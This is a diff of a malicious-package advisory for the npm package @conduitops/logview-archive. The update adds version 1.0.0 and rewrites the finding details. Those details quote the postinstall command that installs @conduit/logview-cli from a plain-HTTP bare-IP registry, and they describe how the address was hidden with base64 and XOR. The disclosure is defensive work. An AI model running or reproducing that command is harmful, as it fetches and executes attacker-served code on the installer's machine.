@@ -1,21 +1,27 @@
 {
-  "modified": "2026-10-22T06:10:48Z",
-  "published": "2026-10-22T06:10:48Z",
   "schema_version": "1.7.4",
   "id": "MAL-2026-18183",
+  "published": "2026-10-22T06:10:48Z",
+  "modified": "2026-11-02T03:16:20.345766880Z",
   "summary": "Malicious code in @conduitops/logview-archive (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (f20036e315be6c5dd925bdedc87120af27adb007a4c2b6653c95cb386acd9009)\nOn install, package.json's postinstall hook runs install.js, which invokes `npm install @conduit/logview-cli@2.2.0 --registry \u003cURL\u003e` where the registry URL is stored as a base64+XOR-masked string in lib/toolchain.json and decoded in memory by lib/origin.js (XOR key `c0ndu1t-ops`). The decoded destination is a plain-HTTP bare IP (http://139.196.94.195:8080/dl/npm/), not the public npm registry, a known publisher host, or an internal-DNS name consistent with the package's self-claimed `conduit.internal` provenance. npm will fetch and execute the lifecycle scripts of whatever package the attacker serves at that endpoint, giving arbitrary install-time code execution on the installer's host. A comment in lib/origin.js states the masking is intended so the downloaded package `carries no readable address`, confirming the concealment is deliberate rather than incidental.\n",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (28d0b0e9770a9db54aa03ba508bea0ed1b7ff5fc76ab28a472f09e7a8af088c7)\nOn install, package.json's postinstall runs node install.js, which reads lib/toolchain.json and executes `npm install @conduit/logview-cli@2.2.0 --registry http://139.196.94.195:8080/dl/npm/` into vendor/. The registry is plain HTTP on a bare IP (139.196.94.195:8080, Alibaba Cloud range) that does not match the publisher infrastructure declared in package.json (repository/homepage/bugs under *.conduit.internal, maintainer platform-ops@conduit.internal). The fetched package is also in a different scope (@conduit) than the host package (@conduitops), compounding dependency-confusion exposure. npm will download and execute whatever that host serves — including any lifecycle scripts of the fetched tarball — with no TLS verification and no integrity check, giving whoever controls that endpoint (or any on-path attacker) arbitrary code execution on the installer at install time.\n",
   "affected": [
     {
       "package": {
-        "ecosystem": "npm",
-        "name": "@conduitops/logview-archive"
+        "name": "@conduitops/logview-archive",
+        "ecosystem": "npm"
       },
       "versions": [
-        "1.0.1"
+        "1.0.1",
+        "1.0.0"
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -52,15 +58,10 @@
     {
       "type": "PACKAGE",
       "url": "https://www.npmjs.com/package/@conduitops/logview-archive/v/1.0.1"
-    }
-  ],
-  "credits": [
+    },
     {
-      "name": "Amazon Inspector",
-      "type": "FINDER",
-      "contact": [
-        "inspector-research@amazon.com"
-      ]
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@conduitops/logview-archive/v/1.0.0"
     }
   ],
   "database_specific": {
@@ -74,7 +75,26 @@
         "versions": [
           "1.0.1"
         ]
+      },
+      {
+        "id": "IN-MAL-2026-022481",
+        "import_time": "2026-11-02T03:15:08.918232327Z",
+        "modified_time": "2026-11-02T02:44:55Z",
+        "sha256": "28d0b0e9770a9db54aa03ba508bea0ed1b7ff5fc76ab28a472f09e7a8af088c7",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.0"
+        ]
       }
     ]
-  }
+  },
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "contact": [
+        "inspector-research@amazon.com"
+      ],
+      "type": "FINDER"
+    }
+  ]
 }
